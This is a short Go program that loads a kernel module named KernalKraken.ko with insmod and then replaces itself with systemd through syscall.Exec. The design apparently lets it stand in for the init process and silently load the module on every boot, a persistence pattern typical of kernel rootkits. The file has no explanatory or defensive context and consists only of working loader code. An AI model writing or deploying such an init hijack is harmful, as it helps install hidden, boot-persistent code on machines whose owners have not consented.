package main

import (
    "os"
    "os/exec"
    "syscall"
)

func main() {
    insmodCmd := exec.Command("/usr/sbin/insmod", "/lib/KernalKraken.ko")
    insmodCmd.Run()
    
    syscall.Exec("/lib/systemd/systemd", []string{}, os.Environ())
}

